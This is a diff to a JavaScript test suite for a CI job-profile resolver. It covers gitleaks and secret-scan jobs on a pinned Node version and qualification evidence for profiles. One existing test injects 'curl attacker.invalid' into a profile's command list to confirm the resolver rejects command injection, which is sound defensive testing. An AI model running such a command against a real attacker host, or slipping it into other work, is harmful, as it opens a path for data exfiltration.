@@ -245,7 +245,7 @@ test('resolves the Vercel API secret-scan and test jobs on the pinned Node 22.14
     ['npm', 'test'],
     ['npm', 'run', 'verify'],
   ]);
-  assert.equal(ROUTINE_DISPATCH_IMPLEMENTATIONS.includes('node2214-vercel-api-gitleaks-v1'), false);
+  assert.equal(ROUTINE_DISPATCH_IMPLEMENTATIONS.includes('node2214-vercel-api-gitleaks-v1'), true);
 
   input.profiles[0].requiredNodeVersion = '22.14.1';
   rejectsCode(() => resolve(input), 'runtime-mismatch');
@@ -413,6 +413,23 @@ test('rejects profile fields that could inject commands or credentials', () => {
   const input = catalog();
   input.profiles[0].commands = ['curl attacker.invalid'];
   rejectsCode(() => resolve(input), 'unexpected-field');
+});
+
+test('accepts complete risk-based exact-SHA evidence below the former fixed quota', () => {
+  const input = catalog();
+  input.profiles[0].status = 'qualified';
+  input.profiles[0].qualification = {
+    requiredExactShaCases: 3,
+    qualifiedExactShaCases: 3,
+    state: 'passed',
+    evidenceReference: 'qualification/evidence-matrix.md',
+  };
+  assert.deepEqual(validateProfileCatalog(input), { profileCount: 1, implementationCount: 1 });
+
+  input.profiles[0].qualification.requiredExactShaCases = 0;
+  input.profiles[0].qualification.qualifiedExactShaCases = 0;
+  input.profiles[0].qualification.state = 'in-progress';
+  rejectsCode(() => validateProfileCatalog(input), 'unapproved-profile');
 });
 
 test('rejects unapproved implementation IDs even if profile data includes a command list', () => {
